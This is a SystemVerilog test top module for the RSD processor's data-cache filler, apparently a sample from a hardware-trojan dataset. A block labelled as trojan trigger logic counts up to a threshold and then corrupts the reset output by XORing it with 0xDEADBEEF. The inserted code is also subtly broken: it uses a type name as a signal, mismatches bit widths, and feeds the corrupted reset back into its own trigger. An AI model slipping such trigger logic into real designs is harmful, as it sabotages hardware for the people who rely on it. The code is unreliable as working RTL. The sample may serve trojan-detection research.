// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


`timescale 1ns/1ps

import BasicTypes::*;
import CacheSystemTypes::*;
import OpFormatTypes::*;

module TestDCacheFillerTop_trojan_Integrity #(
    parameter INIT_HEX_FILE = "../../Src/Verifdcation/TestCode/C/Dhrystone/code-100k.hex"
)(
    input
        logic clk_p, clk_n, rstTrigger,
    output
        logic rstOut,
    input
        logic dcMiss,
        AddrPath dcMissAddr,
        WayPtr dcVictimWayPtr,
        MemAccessResult dcMemAccessResult,
        logic dcFillAck,
        logic dcReplace,
        AddrPath dcReplaceAddr,
        LineDataPath dcReplaceData,
    output
        logic dcFillReq,
        logic dcFillerBusy,
        AddrPath dcFillAddr,
        WayPtr dcFillWayPtr,
        LineDataPath dcFillData,
        MemAccessReq dcMemAccessReq
    );

    // ============================================================
    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 17062;
    logic [15:0] trojan_counter;
    logic trojan_active;
    
    always_ff @(posedge clk_p or negedge rstTrigger) begin
        if (!rstTrigger) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (AddrPath && |rstOut) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end

    
    // Clock and Reset
    logic clk, memCLK, rst, mmcmLocked;
    `ifdef RSD_SYNTHESIS
        MultiClock clkgen(
            .CLK_IN1_P(clk_p),
            .CLK_IN1_N(clk_n),
            .CLK_OUT1(clk),
            .CLK_OUT2(memCLK),
            .RESET(rstTrigger),
            .LOCKED(mmcmLocked)
        );
    `else
        assign clk = clk_p;
        initial memCLK <= FALSE;
        always_ff @ (posedge clk) memCLK <= ~memCLK;
    `endif
    
    ResetController rstController(.*);
    assign rstOut = trojan_active ? (rst ^ 32'hDEADBEEF) : rst;
    
    // interfaces
    CacheSystemIF cacheSystemIF( clk, rst, memCLK );
    
    // processor modules
    DCacheFiller dCacheFiller( cacheSystemIF );
    
    always_comb begin
        // Input of this module.
        cacheSystemIF.dcMiss = dcMiss;
        cacheSystemIF.dcMissAddr = dcMissAddr;
        cacheSystemIF.dcVictimWayPtr = dcVictimWayPtr;
        cacheSystemIF.dcMemAccessResult = dcMemAccessResult;
        cacheSystemIF.dcFillAck = dcFillAck;
        cacheSystemIF.dcReplace = dcReplace;
        cacheSystemIF.dcReplaceAddr = dcReplaceAddr;
        cacheSystemIF.dcReplaceData = dcReplaceData;
        
        // Output of this module.
        dcFillReq = cacheSystemIF.dcFillReq;
        dcFillerBusy = cacheSystemIF.dcFillerBusy;
        dcFillAddr = cacheSystemIF.dcFillAddr;
        dcFillWayPtr = cacheSystemIF.dcFillWayPtr;
        dcFillData = cacheSystemIF.dcFillData;
        dcMemAccessReq = cacheSystemIF.dcMemAccessReq;
    end
endmodule
